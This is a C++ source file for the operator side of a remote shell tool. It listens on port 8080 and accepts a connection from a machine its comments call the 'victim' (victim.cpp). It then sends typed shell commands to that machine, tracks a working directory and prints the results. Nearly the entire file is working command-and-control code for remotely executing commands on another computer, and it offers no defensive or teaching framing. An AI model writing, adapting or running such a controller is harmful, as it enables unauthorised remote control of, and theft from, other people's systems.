#ifdef _WIN32
    #include <winsock2.h>
    #pragma comment(lib, "ws2_32.lib") // Link with ws2_32.lib
    #define close closesocket
    #define read(s, buf, len) recv(s, buf, len, 0)
    typedef int socklen_t;
#else
    #include <sys/socket.h>
    #include <netinet/in.h>
    #include <unistd.h>
#endif
#include <iostream>
#include <cstring>

bool is_relative(const std::string& path) {
    return path[0] == '.' || path[0] != '/';
}

std::string normalize(const std::string& path) {
    if (path[0] == '.' && path[1] == '/') {
        return path.substr(2);
    }
    return path;
}

std::string apply_change(const std::string& new_path, const std::string& current_path) {
    if (is_relative(new_path)) {
        std::string normalized_path = normalize(new_path);
        return current_path + "/" + normalized_path;
    }
    else {
        return new_path;
    }
}

std::string working_directory = ".";

int main() {
    #ifdef _WIN32
        WSADATA wsaData;
        if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
            std::cerr << "Failed to initialize Winsock." << std::endl;
            return 1;
        }
    #endif
    // Create a socket
    int serverSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (serverSocket == -1) {
        std::cerr << "Failed to create socket." << std::endl;
        return 1;
    }

    // Set socket option to reuse address
    int opt = 1;
    if (setsockopt(serverSocket, SOL_SOCKET, SO_REUSEADDR, (const char*)&opt, sizeof(opt)) == -1) {
        std::cerr << "Failed to set socket options." << std::endl;
        return 1;
    }

    // Set up the server address
    sockaddr_in serverAddress{};
    serverAddress.sin_family = AF_INET;
    serverAddress.sin_port = htons(8080);  // Must be the same port as in victim.cpp
    serverAddress.sin_addr.s_addr = INADDR_ANY;

    // Bind the socket to the server address
    if (bind(serverSocket, (struct sockaddr*)&serverAddress, sizeof(serverAddress)) < 0) {
        std::cerr << "Failed to bind the socket." << std::endl;
        return 1;
    }

    // Listen for connections
    if (listen(serverSocket, 1) < 0) {
        std::cerr << "Failed to listen on socket." << std::endl;
        return 1;
    }

    // Accept a connection
    sockaddr_in clientAddress{};
    socklen_t clientSize = sizeof(clientAddress);
    int clientSocket = accept(serverSocket, (struct sockaddr*)&clientAddress, &clientSize);
    if (clientSocket < 0) {
        std::cerr << "Failed to accept connection." << std::endl;
        return 1;
    }

    // Send and receive data
    char buffer[1024];
    std::string message;
    ssize_t bytesRead;

    while (true) {
        std::cout << "\x1b[?25h";  // Show the cursor
        std::cout << "> ";
        std::getline(std::cin, message);
        // check if message starts by "SETWD"
        if (message.substr(0, 5) == "SETWD") {
            // get the path
            std::string path = message.substr(6);
            working_directory = apply_change(path, working_directory);
            message = "pwd";
        }

        message = "cd " + working_directory + " && " + message;

        // message += "\n";  // Remove this line
        send(clientSocket, message.c_str(), message.size(), 0); // Send message to victim

        std::string response;
        while ((bytesRead = read(clientSocket, buffer, sizeof(buffer))) > 0) {
            response += std::string(buffer, bytesRead);
            size_t found = response.find("COMMAND_EXECUTION_DONE");
            if (found != std::string::npos) {
                // Stop reading when the command execution is done
                // Remove the "COMMAND_EXECUTION_DONE" string from the response
                response.erase(found, strlen("COMMAND_EXECUTION_DONE"));
                break;
            }
            if (buffer[bytesRead - 1] == '\n') {  // If the last character is a newline, print the response and clear it
                std::cout << response << std::flush;  // Add flush here
                response.clear();
            }
        }
        if (!response.empty()) {  // If there's any remaining response that doesn't end with a newline, print it
            std::cout << response << std::flush;  // And here
        }
    }

    // Close the sockets
    close(clientSocket);
    close(serverSocket);

        #ifdef _WIN32
            WSACleanup();
        #endif

    return 0;
}